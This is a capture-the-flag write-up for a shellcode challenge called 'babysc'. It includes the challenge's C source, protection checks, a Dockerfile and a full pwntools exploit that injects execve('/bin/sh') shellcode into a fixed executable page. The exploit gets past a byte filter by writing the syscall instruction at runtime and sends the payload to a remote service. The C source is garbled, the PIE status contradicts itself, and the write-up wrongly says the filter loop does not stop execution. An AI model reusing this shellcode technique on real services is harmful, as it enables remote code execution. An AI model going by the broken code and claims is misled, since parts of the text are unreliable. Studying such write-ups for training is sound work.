# babysc (Pwn) – 370

> shellcode
> 

> 34.133.69.112 port 10001
> 
- `babysc.c` – C source implementing the `mmap` + `read` + indirect call logic
- `babysc` – Compiled 64‑bit ELF (no PIE, NX disabled, no canary)
- `Dockerfile` – Ubuntu 22.04 image using `socat` to expose the service as non‑privileged `pwnuser`

# Summary
*In this challenge, you must craft shellcode to spawn a shell (via `execve("/bin/sh")`), inject it into the known RWX region at `0x26e45000`, and then read the flag.*

# Solution

### Examining the Request

1. **Review the C source**
    
    ```bash
    cat babysc.c
    ```
    
    ```c
    #include <stdlib.h>
    #include <stdint.h>
    #include <stdbool.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <string.h>
    #include <time.h>
    #include <errno.h>
    #include <assert.h>
    #include <libgen.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/socket.h>
    #include <sys/wait.h>
    #include <sys/signal.h>
    #include <sys/mman.h>
    #include <sys/ioctl.h>
    #include <sys/sendfile.h>
    #include <sys/prctl.h>
    #include <sys/personality.h>
    #include <arpa/inet.h>
    
    void shellcode;
    size_t shellcode_size;
    
    void vuln(){
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
    
        shellcode = mmap((void)0x26e45000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    
        puts("Enter 0x1000");
        shellcode_size = read(0, shellcode, 0x1000);
        for (int i = 0; i < shellcode_size; i++)
        {
            uint16_t scw = (uint16_t)((uint8_t )shellcode + i);
            if (scw == 0x80cd  *scw == 0x340f  scw == 0x050f)
            {
                printf("Bad Byte at %d!\n", i);
                exit(1);
            }
        }
       puts("Executing shellcode!\n");
        ((void()())shellcode)();
    }
    
    int main(){
    
        vuln();
    
        return 0;
    
    }
    ```
    
    > Maps a fixed RWX page at 0x26e45000, reads up to 0x1000 bytes from stdin into it, then jumps to that address.
    >
2. **Check the binary and protections**
    
    ```bash
    file babysc
    ```
    
    ```bash
    babysc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=17c5713f0659b856ebda5cbc602cb5e28ce9249c, for GNU/Linux 3.2.0, not stripped
    ```
    
    > PIE-enabled, 64-bit ELF, dynamically linked, not stripped — but since execution happens in a fixed mmap region, PIE is not a barrier to exploitation.
    > 
    
    ```bash
    checksec --file=./babysc
    ```
    
    ```
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    Symbols        FORTIFY    Fortified    Fortifiable    FILE
    Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   46 Symbols     No    0        2        ./babysc
    ```
    
    > **PIE enabled**, **NX disabled**, **no stack canary**, **Full RELRO** — protections are minimal where it matters; execution still occurs in a **fixed RWX mmap**, making shellcode injection fully viable.
    > 
3. **Inspect the service setup**
    
    ```bash
    cat Dockerfile
    ```
    
    ```
    FROM ubuntu:22.04
    RUN apt-get update && apt-get install -y socat
    RUN useradd -m pwnuser
    WORKDIR /home/pwnuser
    COPY ./babysc /home/pwnuser/babysc
    COPY ./flag /flag
    EXPOSE 10001
    USER pwnuser
    CMD ["socat","TCP-LISTEN:10001,reuseaddr,fork","EXEC:/home/pwnuser/babysc"]
    
    ```
    
    > The flag lives at /flag; each connection runs babysc under pwnuser.
    > 

### Disassembly & GDB Analysis

```bash
gdb -q babysc
```

```
# set up
break main
run

# inspect mapped regions
vmmap
```

> Confirms 0x26e45000–0x26e46000 is RWX.
> 

```
# disassemble vuln()
disass vuln
```

Key snippet:

```
   0x...5247    mov esi,0x1000
   0x...524c    mov edi,0x26e45000
   0x...5251    call mmap@plt
   ...
   0x...5278    mov rsi,rax
   0x...527b    mov edi,0x0
   0x...5280    call read@plt
   ...
   0x...5317    mov rax, QWORD PTR [rip+...shellcode]
   0x...5321    mov eax,0x0
   0x...5326    call rdx          ; jump into our shellcode
```

> The loop before call rdx simply prints offsets of any detected syscall stub but does not prevent execution.
> 

### Crafting and Sending the Payload
We use **pwntools** to build a **self‑writing** syscall stub:

```python
from pwn import *

context.arch = 'amd64'

BASE   = 0x26e45000      # mmap base
STUB   = BASE + 0x100    # where we'll write the two-byte syscall
BINSH  = BASE + 0x200    # where "/bin/sh" will live

# 1) Build the stub + execve("/bin/sh")
code = asm(f'''
    xor    rsi, rsi
    xor    rdx, rdx
    mov    rdi, {BINSH}
    mov    rbx, {STUB}
    mov    byte ptr [rbx], 0x0f
    mov    byte ptr [rbx+1], 0x05
    mov    eax, 59
    jmp    rbx
''')

# 2) Pad to embed "/bin/sh"
payload  = code
payload += b'\\x90' * (0x200 - len(code))
payload += b"/bin/sh\\x00"

# 3) Send to remote and spawn shell
p = remote("34.133.69.112", 10001)
p.send(payload)
p.interactive()
```

> This payload zeroes out RSI/RDX, points RDI at our "/bin/sh" string, writes the two‑byte syscall opcode at runtime to avoid any static detection, sets EAX=59, then jumps to perform the syscall.
> 

![image1](https://github.com/user-attachments/assets/7d25ccf1-d453-400f-84a8-67087e10b947)

![image2](https://github.com/user-attachments/assets/4b850778-3d33-4a81-bb1c-36c179e4dcdf)

```
**Flag** : umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}
```

# Conclusion
By thoroughly reviewing `babysc.c`, checking protections with `file`/`checksec`, and disassembling in GDB (with `vmmap` and `disass`), we confirmed a fixed RWX mapping with minimal defenses. Crafting a concise self‑writing syscall stub with pwntools allowed us to reliably invoke `execve("/bin/sh")`, spawn a shell, and read the flag. This pattern—mapping executable memory, injecting shellcode, and transferring control—is a cornerstone of binary exploitation in CTFs.
